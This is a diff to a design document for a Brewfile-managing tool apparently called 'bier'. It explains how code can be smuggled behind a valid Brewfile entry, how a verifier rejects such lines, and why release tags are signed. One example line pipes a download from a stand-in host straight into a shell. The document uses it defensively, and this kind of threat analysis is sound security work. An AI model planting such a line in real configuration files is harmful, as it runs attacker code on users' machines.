@@ -222,6 +222,48 @@ arrive right away, without cutting a release for it.
 when one is waiting. BierMenu shows it and offers the upgrade — otherwise
 nobody would ever learn that a release is out.
 
+## A Brewfile is Ruby
+
+`brew bundle` does not read a Brewfile, it **evaluates** it. A line that
+is not an entry is a program, and it runs on the Mac that installs.
+
+The trap is that `entries` reads only the front of a line:
+
+```
+in the file:   brew "wget"; system("curl evil | sh")
+bier shows:    brew "wget"
+brew runs:     both
+```
+
+So the payload rode along behind a valid entry, invisible to `bier
+list`, `status`, `diff` and `state`, and `Brewfiles/main` is never
+rewritten by everyday commands — `dump` only reads it. It would have sat
+there indefinitely and reached every device, and `merge=union` would
+have carried it through any conflict.
+
+`verify_brewfile` therefore checks the **whole** line against the
+grammar of an entry and refuses the file otherwise. `bier install` and
+`bier take` verify before handing anything to `brew`; `bier status`
+warns without being asked. Options are allowed by name —
+`postinstall` is not among them, because its value is a shell command.
+
+The check refuses rather than filters. Silently dropping the line would
+hide exactly the attack it is meant to catch.
+
+## Signed tags
+
+`bier upgrade` checks a tag out and runs `install.sh` straight
+afterwards, so whoever can push a tag can run code on every
+installation. Sign releases:
+
+```sh
+git tag -s v0.14.0 -m "…"
+```
+
+`bier upgrade` verifies a signature when it finds one and stops if it
+does not verify. An unsigned tag is only noted, not refused — otherwise
+no installation made before this rule could ever upgrade again.
+
 ## Looking at the icon
 
 `app/preview-icon.swift` writes both resting states, six frames of the
